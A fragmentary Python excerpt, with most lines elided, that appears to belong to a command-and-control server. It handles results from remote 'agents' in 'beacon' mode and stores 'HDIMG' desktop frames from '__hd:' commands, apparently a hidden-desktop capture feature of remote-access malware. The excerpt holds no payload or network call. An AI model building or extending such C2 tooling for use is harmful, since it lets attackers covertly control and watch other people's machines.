        ...
        if agent_id in self.agents:
            ...
            for result in results:
                ...
                if agent.mode == 'beacon':
                    ...
                    if len(agent.pending_results) > 200:
                        agent.pending_results = agent.pending_results[-200:]
                else:
                    try:
                        agent.response_queue.put_nowait(output)
                    except asyncio.QueueFull:
    ...
    def _note_desktop(self, agent):
        for row in agent.pending_results:
            ...
            if not cmd.startswith('__hd:'):
                continue
            if out.startswith('HDIMG:') and out != 'HDIMG:same':
                agent.desktop_frame = out
            elif out and not out.startswith('HDIMG:'):
